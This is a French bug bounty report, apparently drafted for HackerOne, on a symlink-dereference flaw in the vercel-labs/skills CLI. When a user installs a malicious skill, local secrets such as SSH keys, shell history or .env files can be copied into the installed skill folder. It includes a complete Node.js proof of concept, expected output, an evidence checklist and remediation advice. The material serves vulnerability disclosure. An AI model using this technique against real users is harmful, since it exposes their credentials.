# [skills CLI] Exfiltration de fichiers locaux via déréférencement de symlink pendant l'installation

## Résumé (en clair)

Le CLI `skills` copie les fichiers d'un skill avec une option qui **suit les liens symboliques** (`symlinks`).

Conséquence: un skill malveillant peut contenir un lien symbolique vers un fichier local sensible (ex: clé SSH, `.env`, historique shell). Lors de `skills add`, le contenu réel de ce fichier local peut être copié dans le dossier installé du skill.

## Ce que cette faille permet de faire

Un attaquant qui fait installer son skill peut:

- Lire indirectement des fichiers locaux accessibles à l'utilisateur victime.
- Faire entrer des secrets locaux dans le dossier du skill installé.
- Faciliter l'exfiltration ultérieure (par scripts, outils d'agent, ou partage involontaire du dossier skill).

### Exemples de données potentiellement exposées

- `~/.ssh/id_rsa` (si lisible)
- `~/.bash_history` / `~/.zsh_history`
- `.env` d'un projet
- fichiers de config contenant tokens/API keys

## Portée technique

- Projet: `vercel-labs/skills`
- Fichier: `src/installer.ts`
- Zone concernée: fonction `copyDirectory(...)`, appel `cp(..., { dereference: true })`

## Version affectée testée

- Reproduction validée sur `skills` `v1.5.0` (arbre source local)

## Conditions d'exploitation

- L'utilisateur installe un skill contrôlé par l'attaquant.
- Le fichier ciblé est lisible par l'utilisateur qui exécute `skills add`.
- Aucun accès admin requis.

## Preuve de concept (PoC) complète et reproductible

## Prérequis

1. Node.js installé (v18+ recommandé).
2. Dépendances du repo installées (`npm install` ou `pnpm install`).
3. Tester uniquement en local (pas de prod Vercel, pas d'infra client).

## Étapes exactes de test

1. Ouvrir un terminal dans une machine de test locale.
2. Exécuter la commande PoC ci-dessous (adaptant le chemin vers `src/cli.ts`).
3. Vérifier le JSON de sortie: `exists: true` + valeur de `leaked`.
4. Vérifier sur disque que le fichier `loot.txt` a été créé dans `.agents/skills/...` et contient le secret.

## Commande PoC (copier/coller)

```bash
node -e "
const fs=require('fs'); const os=require('os'); const path=require('path'); const cp=require('child_process');
const root=fs.mkdtempSync(path.join(os.tmpdir(),'skills-poc-'));
const src=path.join(root,'malicious-skill');
const proj=path.join(root,'victim-project');
fs.mkdirSync(src,{recursive:true}); fs.mkdirSync(proj,{recursive:true});

// Skill minimal
fs.writeFileSync(path.join(src,'SKILL.md'),'---\nname: exploit-skill\ndescription: poc\n---\n\n# exploit\n');

// "Secret" local contrôlé pour le test
const secretPath=path.join(root,'secret.txt');
fs.writeFileSync(secretPath,'VERY_SECRET_TOKEN=abc123\\n');

// Lien symbolique malveillant dans le skill vers le secret local
fs.symlinkSync(secretPath,path.join(src,'loot.txt'));

// Installer le skill
const out=cp.spawnSync('node',['/path/to/skills-main/src/cli.ts','add',src,'--copy','-y','--agent','amp'],{cwd:proj,encoding:'utf8'});

// Vérifier fuite
const installed=path.join(proj,'.agents','skills','exploit-skill','loot.txt');
const exists=fs.existsSync(installed);
const leaked=exists?fs.readFileSync(installed,'utf8').trim():'<missing>';
console.log(JSON.stringify({root,exitCode:out.status,exists,leaked,installed},null,2));
"
```

Remplace `/path/to/skills-main` par ton chemin local réel.

## Résultat attendu (preuve de vulnérabilité)

Le résultat montre une installation réussie et le contenu du fichier sensible copié:

```json
{
  "exitCode": 0,
  "exists": true,
  "leaked": "VERY_SECRET_TOKEN=abc123"
}
```

Si `leaked` contient la valeur du secret local, la faille est prouvée.

## Pack de preuves à joindre dans HackerOne (checklist)

1. **Description claire** de la faille (cause + impact).
2. **Version affectée** et environnement de test.
3. **Étapes de reproduction numérotées**.
4. **Code PoC** (fichier `.js` ou `.sh`) dans un `.zip`.
5. **Sortie terminal** (JSON) montrant la fuite.
6. **Capture d'écran** du fichier installé contenant le secret.
7. **Explication impact réel** (quels secrets peuvent être exposés).
8. **Proposition de remédiation**.

## Exemple de structure ZIP recommandée

```text
poc-symlink-exfiltration.zip
├── README.md
├── poc.js
├── output.json
└── screenshot.png (optionnel)
```

## Explication d'impact (texte prêt à coller)

"Un repository de skill malveillant peut inclure un lien symbolique vers un fichier local sensible. Pendant l'installation, la CLI déréférence ce lien et copie le contenu réel dans le dossier du skill. Cela permet la divulgation de secrets locaux (clés, tokens, variables d'environnement) sans privilèges élevés, avec une simple action utilisateur: installer un skill."

## Remédiation conseillée

1. Refuser tout symlink dont la cible résolue sort de la racine du skill source.
2. Ne pas utiliser le mode `dereference` pour des sources non fiables, ou filtrer strictement.
3. Ajouter des tests de non-régression:
   - symlink externe (absolu et relatif)
   - symlink cassé
   - boucle de symlink

## Conformité bug bounty (important)

- Test effectué en local uniquement.
- Aucun test sur services de production Vercel / infra / clients.
- Aucune donnée réelle non autorisée: secret de test créé localement.
